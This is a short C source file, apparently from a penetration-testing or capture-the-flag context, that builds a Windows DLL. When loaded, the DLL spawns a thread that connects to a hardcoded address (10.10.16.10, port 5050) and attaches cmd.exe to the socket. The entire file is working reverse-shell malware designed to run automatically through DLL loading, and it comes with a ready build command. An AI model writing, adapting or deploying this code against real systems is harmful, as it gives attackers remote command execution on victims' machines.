// Author: Arthx
// To build execute:
// x86_64-w64-mingw32-gcc -shared -o shell5050.dll shell.c -lws2_32

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
const char *ip_addr = "10.10.16.10"; 
const char *port = "5050";            

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

DWORD WINAPI runExec(LPVOID lpParam)
{
    // Inicializar Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // Criar socket
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (Winsock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Configurar sockaddr_in
    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    // Conectar ao servidor
    if (WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) != 0) {
        closesocket(Winsock);
        WSACleanup();
        return 1;
    }

    // Configurar STARTUPINFO
    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    
    // Criar processo
    TCHAR cmd[] = TEXT("cmd.exe");
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info)) {
        closesocket(Winsock);
        WSACleanup();
        return 1;
    }

    // Fechar handles
    CloseHandle(processo_info.hProcess);
    CloseHandle(processo_info.hThread);
    closesocket(Winsock);
    WSACleanup();

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, runExec, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
}
